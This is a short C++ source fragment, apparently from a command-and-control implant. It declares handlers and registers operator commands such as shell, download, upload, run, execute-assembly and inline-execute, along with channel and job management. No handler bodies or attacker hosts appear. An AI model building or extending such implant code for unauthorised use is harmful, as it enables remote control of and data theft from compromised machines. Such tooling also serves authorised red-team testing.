#include "Command.h"

BOOL CommandChannelRegister(json& args, string artifact, json& result);
BOOL CommandChannelSwitch(json& args, string artifact, json& result);
BOOL CommandChannelList(json& args, string artifact, json& result);
BOOL CommandChannelRemove(json& args, string artifact, json& result);
BOOL CommandExit(json& args, string artifact, json& result);
BOOL CommandPs(json& args, string artifact, json& result);
BOOL CommandCd(json& args, string artifact, json& result);
BOOL CommandCp(json& args, string artifact, json& result);
BOOL CommandShell(json& args, string artifact, json& result);
BOOL CommandDownload(json& args, string artifact, json& result);
BOOL CommandUpload(json& args, string artifact, json& result);
BOOL CommandRun(json& args, string artifact, json& result);
BOOL CommandExecuteAssembly(json& args, string artifact, json& result);
BOOL CommandJobList(json& args, string artifact, json& result);
BOOL CommandJobStop(json& args, string artifact, json& result);
BOOL CommandInlineExecute(json& args, string artifact, json& result);

std::vector<ImplantCommand> g_CommandRegistry = {
  {"exit",                 CommandExit            },
  {"channel.switch",       CommandChannelSwitch   },
  {"channel.register",     CommandChannelRegister },
  {"channel.remove",       CommandChannelRemove   },
  {"ps",                   CommandPs              },
  {"cd",                   CommandCd              },
  {"cp",                   CommandCp              },
  {"download",             CommandDownload        },
  {"upload",               CommandUpload          },
  {"shell",                CommandShell           },
  {"run",                  CommandRun             },
  {"execute-assembly",     CommandExecuteAssembly },
  {"job.list",             CommandJobList         },
  {"job.stop",             CommandJobStop         },
  {"inline-execute",       CommandInlineExecute   }
};